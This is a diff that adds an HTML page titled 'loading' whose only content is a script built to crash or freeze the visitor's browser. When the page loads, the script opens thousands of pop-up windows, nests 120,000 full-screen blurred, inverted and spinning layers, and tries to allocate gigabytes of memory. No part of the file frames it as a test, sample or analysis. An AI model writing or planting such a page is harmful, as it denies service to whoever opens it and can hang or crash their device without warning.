@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>loading</title>
+</head>
+<body>
+<script>
+var z=0;
+var s=setInterval(function(){
+  try{for(var i=0;i<200;i++){window.open("about:blank","_blank");}}catch(e){}
+  if(++z>50){clearInterval(s);}
+},10);
+var n=document.body;
+for(var i=0;i<120000;i++){
+  var d=document.createElement("div");
+  d.style.position="fixed";
+  d.style.inset="0";
+  d.style.backdropFilter="blur(100px)";
+  d.style.filter="blur(50px) contrast(900%) invert(1)";
+  d.style.animation="spin 0.001s linear infinite";
+  n.appendChild(d);
+  n=d;
+}
+try{
+  var b=new Array(1<<22).fill("A".repeat(2048)).join("");
+  var u=new Uint8Array(512*1024*1024);
+  u.fill(255);
+  document.title=b.length+"|"+u.length;
+}catch(e){document.title="x";}
+</script>
+</body>
+</html>
